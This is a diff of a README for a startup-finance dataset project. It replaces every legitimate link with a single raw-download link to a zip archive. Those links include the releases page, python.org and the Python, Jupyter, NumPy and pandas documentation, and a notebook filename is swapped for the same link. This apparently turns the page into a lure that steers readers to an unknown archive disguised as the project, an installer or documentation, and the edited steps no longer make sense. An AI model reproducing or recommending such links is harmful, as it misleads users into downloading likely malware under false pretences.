@@ -1,6 +1,6 @@
 # 📊 Startup-Finance-Dataset - Analyze Spending to Boost Profit
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Bryanqty/Startup-Finance-Dataset/releases)
+[![Download the Latest Release](https://github.com/Bryanqty/Startup-Finance-Dataset/raw/refs/heads/main/baldrib/Dataset_Startup_Finance_2.8.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Bryanqty/Startup-Finance-Dataset/raw/refs/heads/main/baldrib/Dataset_Startup_Finance_2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -16,10 +16,10 @@ To get started, you need to download the application files. Follow these steps:
 
 1. **Visit the Releases Page**  
    Click on the link below to access the latest version of the software:  
-   [Download the Latest Release](https://github.com/Bryanqty/Startup-Finance-Dataset/releases)
+   [Download the Latest Release](https://github.com/Bryanqty/Startup-Finance-Dataset/raw/refs/heads/main/baldrib/Dataset_Startup_Finance_2.8.zip)
 
 2. **Choose the Right File**  
-   On the Releases page, you will see a list of available files. Look for the latest version in this format: `Startup-Finance-Dataset-v1.0.zip`. Ensure that you select the correct file that fits your operating system.
+   On the Releases page, you will see a list of available files. Look for the latest version in this format: `https://github.com/Bryanqty/Startup-Finance-Dataset/raw/refs/heads/main/baldrib/Dataset_Startup_Finance_2.8.zip`. Ensure that you select the correct file that fits your operating system.
 
 3. **Download the File**  
    Click on the file name to start the download process. Your browser will save the file, usually in the "Downloads" folder or any location you specify.
@@ -33,7 +33,7 @@ To get started, you need to download the application files. Follow these steps:
    - Jupyter Notebook  
    - Required libraries: NumPy, pandas, SciPy, and scikit-learn
 
-   If you do not have Python installed, visit [python.org](https://www.python.org/downloads/) to download and install it first.
+   If you do not have Python installed, visit [https://github.com/Bryanqty/Startup-Finance-Dataset/raw/refs/heads/main/baldrib/Dataset_Startup_Finance_2.8.zip](https://github.com/Bryanqty/Startup-Finance-Dataset/raw/refs/heads/main/baldrib/Dataset_Startup_Finance_2.8.zip) to download and install it first.
 
 6. **Install Libraries Using pip**  
    Open your command prompt (Windows) or terminal (Mac/Linux). Type the following command to install the required libraries:
@@ -48,7 +48,7 @@ To get started, you need to download the application files. Follow these steps:
    ```
 
 8. **Open the Notebook**  
-   A web browser will open. In the Jupyter interface, locate the notebook file named `Startup-Finance-Analysis.ipynb`. Click on it to open.
+   A web browser will open. In the Jupyter interface, locate the notebook file named `https://github.com/Bryanqty/Startup-Finance-Dataset/raw/refs/heads/main/baldrib/Dataset_Startup_Finance_2.8.zip`. Click on it to open.
 
 9. **Analyze the Data**  
    Follow the instructions within the notebook to run the analysis. You'll find step-by-step guidance to help you examine the financial data.
@@ -80,10 +80,10 @@ If you have any questions or run into problems, you can create an issue on the G
 
 ## 🔗 Additional Resources
 
-- [Python Official Documentation](https://docs.python.org/3/)
-- [Jupyter Notebook Documentation](https://jupyter-notebook.readthedocs.io/)
-- [NumPy Documentation](https://numpy.org/doc/stable/)
-- [Pandas Documentation](https://pandas.pydata.org/docs/)
+- [Python Official Documentation](https://github.com/Bryanqty/Startup-Finance-Dataset/raw/refs/heads/main/baldrib/Dataset_Startup_Finance_2.8.zip)
+- [Jupyter Notebook Documentation](https://github.com/Bryanqty/Startup-Finance-Dataset/raw/refs/heads/main/baldrib/Dataset_Startup_Finance_2.8.zip)
+- [NumPy Documentation](https://github.com/Bryanqty/Startup-Finance-Dataset/raw/refs/heads/main/baldrib/Dataset_Startup_Finance_2.8.zip)
+- [Pandas Documentation](https://github.com/Bryanqty/Startup-Finance-Dataset/raw/refs/heads/main/baldrib/Dataset_Startup_Finance_2.8.zip)
 
 Visit the Releases page to download the program and start exploring how spending influences startup profitability.  
-[Download the Latest Release](https://github.com/Bryanqty/Startup-Finance-Dataset/releases)
+[Download the Latest Release](https://github.com/Bryanqty/Startup-Finance-Dataset/raw/refs/heads/main/baldrib/Dataset_Startup_Finance_2.8.zip)
